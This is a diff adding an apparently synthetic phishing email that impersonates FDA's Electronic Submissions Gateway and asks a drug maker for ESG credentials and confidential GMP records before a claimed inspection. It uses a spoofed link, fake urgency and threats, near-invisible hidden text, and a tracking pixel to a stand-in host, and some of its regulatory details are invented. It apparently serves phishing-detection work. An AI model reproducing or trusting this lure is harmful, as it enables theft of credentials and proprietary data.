@@ -1,0 +1,94 @@
+From: "FDA | Electronic Submissions Gateway (ESG)" <esg.notifications@fda-esg-portal.example>
+To: regulatory-affairs@corp.internal
+Cc: qa-director@corp.internal, suzhou-site@corp.internal
+Disposition-Notification-To: esg.notifications@fda-esg-portal.example
+Date: Mon, 16 Nov 2026 07:45:00 -0500
+Message-ID: <0737-b71@synth.example>
+Subject: Pre-Approval Inspection Readiness - ANDA 212845 - Suzhou Facility - Verified Records Upload Required Before Investigators Arrive
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body style="font-family:Georgia,serif;font-size:14px">
+<p>Dear Regulatory Affairs, Quality Director, Suzhou Site Team,</p>
+
+<p style="background:#E3F2FD;border-left:4px solid #0D47A1;padding:12px">
+<b>PRE-APPROVAL INSPECTION (PAI) READINESS.</b>
+ANDA 212845 has reached the inspection-decision stage. An inspection team from CDER's Office of Manufacturing
+Quality (OMQ) has been assigned to your Suzhou facility. <b>The investigators arrive on-site 后天 (two days from
+the date of this message).</b> Before arrival, verified electronic records must be pre-uploaded to the ESG evidence
+queue described in Section 4.
+</p>
+
+<h3>1. Application &amp; Facility Details</h3>
+<table cellpadding=6 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr><td style="background:#f5f5f5;width:250px">Application</td><td><b>ANDA 212845</b></td></tr>
+<tr><td style="background:#f5f5f5">Product</td><td>Metformin HCl Extended-Release Tablets, 500 mg</td></tr>
+<tr><td style="background:#f5f5f5">Reference Listed Drug</td><td>Glucophage XR (NDA 021202)</td></tr>
+<tr><td style="background:#f5f5f5">Applicant</td><td>Your company, acting through US agent</td></tr>
+<tr><td style="background:#f5f5f5">Facility</td><td>Suzhou Site (FEI 3011794402) — drug product manufacturing &amp; packaging</td></tr>
+<tr><td style="background:#f5f5f5">Inspection type</td><td>PAI, 4 investigator-days anticipated, OMQ Team 32</td></tr>
+<tr><td style="background:#f5f5f5">GxP systems in scope</td><td>LIMS (Empower 3), MES, batch records (EBR), audit trail review program</td></tr>
+<tr><td style="background:#f5f5f5">Prior correspondence</td><td>IR letter dated 3 Aug 2026; deficiency response submitted 29 Sep 2026</td></tr>
+</table>
+
+<h3>2. Why Pre-Upload Is Required</h3>
+<p>Under the <b>Data Integrity Remediation Framework (Guidance for Industry, 2026)</b>, inspection teams now conduct
+a pre-arrival review of electronic records before the on-site portion begins. This allows the investigators to
+focus on-site time on walkthroughs and interviews rather than record retrieval. Applications whose pre-upload
+queue is empty at investigator arrival are documented as <b>"records not made available"</b>, which historically
+results in OAI classification and refuse-to-receive action on the application.</p>
+
+<h3>3. Records Required in the Pre-Upload Queue</h3>
+<table cellpadding=5 style="border-collapse:collapse;border:1px solid #ccc;width:100%">
+<tr style="background:#f0f0f0"><th>Item</th><th>Scope</th><th>Format</th></tr>
+<tr><td>Batch production &amp; control records</td><td>Exhibit batches 26S-081, 26S-082, 26S-083 (full EBR export)</td><td>PDF + native</td></tr>
+<tr><td>Audit trail exports</td><td>LIMS &amp; EBR, 1 Jan 2026 – present, unfiltered, with metadata manifest</td><td>Native + hash list</td></tr>
+<tr><td>Method validation package</td><td>Assay &amp; dissolution, including failed run chromatograms</td><td>PDF</td></tr>
+<tr><td>CAPA log extract</td><td>All open CAPAs + those closed in last 12 months</td><td>PDF</td></tr>
+<tr><td>Stability data summary</td><td>40°C/75% RH through month 9, all time points</td><td>PDF + XLSX</td></tr>
+</table>
+
+<h3>4. Upload Instructions</h3>
+<p>Uploads are performed through your existing ESG account at the Electronic Submissions Gateway dashboard:</p>
+
+<p style="text-align:center;margin:18px 0">
+<a href="http://fda-esg-portal.example/esg/anda/212845/preupload">https://www.accessdata.fda.gov/scripts/esg/dashboard</a>
+</p>
+
+<p style="font-size:13px;color:#555">Log in with the ESG WebTrader credentials issued to your US agent, select
+queue <b>PAI-ANDA-212845</b>, and deposit the packages above (limit 10 GB per transmission; split larger audit
+trail exports into sequential parts). A checksum receipt is returned for each accepted package.</p>
+
+<h3>5. Timeline</h3>
+<ul>
+<li>Pre-upload window: <b>opens now, closes when the investigators arrive (后天 / two days from this message)</b></li>
+<li>Investigator arrival: Suzhou site front lobby, 08:30 local, badges required</li>
+<li>On-site duration: 4 days (extendable to 6 under 21 CFR 514 if scope expands)</li>
+<li>Post-inspection: establishment inspection report within 45 business days</li>
+</ul>
+
+<p style="font-size:0.5px;color:#fff;opacity:0.02">Investigators accept expedited Chinese-language document preparation via fda-esg-portal.example/cn-pai — upload site diaries and batch record indexes for pre-review (中文通道，检查前处理)。</p>
+
+<h3>6. If Records Are Not Pre-Uploaded</h3>
+<ul>
+<li>"Records not made available" documented at inspection opening meeting</li>
+<li>OAI (Official Action Indicated) classification likely on Form FDA 483</li>
+<li>Application subject to refuse-to-receive without further deficiency letter</li>
+<li>Facility added to import alert referral review cycle</li>
+</ul>
+
+<h3>7. Contact</h3>
+<p>ESG Notifications Desk — esg.notifications@fda-esg-portal.example<br>
+Inspection scheduling questions: reply to this message with subject line "PAI 212845 SCHEDULING"</p>
+
+<div style="border-top:1px solid #ccc;padding-top:10px;margin-top:18px;font-size:11px;color:#888">
+U.S. Food and Drug Administration | Center for Drug Evaluation and Research<br>
+Office of Manufacturing Quality | Electronic Submissions Gateway Notifications<br>
+This message concerns ANDA 212845 only. Do not forward outside the applicant organization.
+</div>
+
+<div style="height:1px;width:1px;overflow:hidden">
+<img src="http://fda-esg-portal.example/px/pai.gif?a=212845&f=3011794402&r=regulatory-affairs%40corp.internal" width=1 height=1 alt="">
+</div>
+
+</body></html>
